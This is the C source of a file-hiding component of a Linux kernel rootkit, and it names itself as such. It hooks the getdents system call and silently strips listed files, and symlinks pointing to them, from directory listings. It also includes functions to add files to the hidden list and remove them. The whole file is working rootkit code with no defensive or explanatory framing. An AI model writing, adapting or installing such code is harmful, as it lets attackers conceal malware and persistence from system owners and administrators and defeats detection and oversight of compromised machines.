#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "file_masking.h"
#include "core.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

#define NAME_BUF_SIZE 200
#define PRINT(str) printk(KERN_INFO "rootkit file_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)

struct hidden_file {
	char *file;
	struct list_head list;
};

LIST_HEAD(hidden_files);
static int show_debug_messages;

int should_mask(char *name);
asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path, char __user *buf, int bufsiz);

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
void file_masking_init(int debug_mode_on, void *readlinkat)
{
	show_debug_messages = debug_mode_on;
	readlinkat_syscall = readlinkat;

	register_callback(__NR_getdents, (void*)file_masking_getdents_syscall);

	DEBUG_PRINT("initialized");
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
void file_masking_exit(void)
{
	deregister_callback(__NR_getdents, (void*)file_masking_getdents_syscall);

	DEBUG_PRINT("exit");

	return;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int file_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret)
{
	int nread_temp;
	char name[NAME_BUF_SIZE];
	int size = 0;

	nread_temp = ret;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;
		size = 0;

		set_fs(KERNEL_DS);
		size = readlinkat_syscall(fd, dirp->d_name, name, NAME_BUF_SIZE);
		set_fs(USER_DS);

		if (size > 0)
			name[size] = '\0';

		if (should_mask(dirp->d_name) || (size > 0 && should_mask(name))) {
			if (size > 0)
				;
				//PRINT("hiding link %s which points to file %s\n", dirp->d_name, name);
			else
				;
				//PRINT("hiding file %s\n", dirp->d_name);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			ret -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return ret;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return ret;
}


int file_is_hidden(const char *name)
{
	struct hidden_file *cur;
	struct list_head *cursor, *next;

	list_for_each_safe(cursor, next, &hidden_files) {
		cur = list_entry(cursor, struct hidden_file, list);
		if (strcmp(cur->file, name) == 0)
			return 1;
	}

	return 0;
}


/* Function that checks whether we need to mask the specified pid */
int should_mask(char *name)
{
	if (file_is_hidden(name))
		return 1;

	return 0;
}


int hide_file(char *name)
{
	struct hidden_file *new;

	if (file_is_hidden(name))
		return -1;

	if ((new = kmalloc(sizeof(struct hidden_file), GFP_KERNEL)) == NULL)
		return -ENOMEM;

	new->file = name;
	list_add(&new->list, &hidden_files);

	return 0;
}

int reveal_file(char *name)
{
	struct hidden_file *cur;
	struct list_head *cursor, *next;

	list_for_each_safe(cursor, next, &hidden_files) {
		cur = list_entry(cursor, struct hidden_file, list);
		if (strcmp(cur->file, name) == 0) {
			list_del(cursor);
			kfree(cur);

			return 0;
		}
	}

	return 1;
}
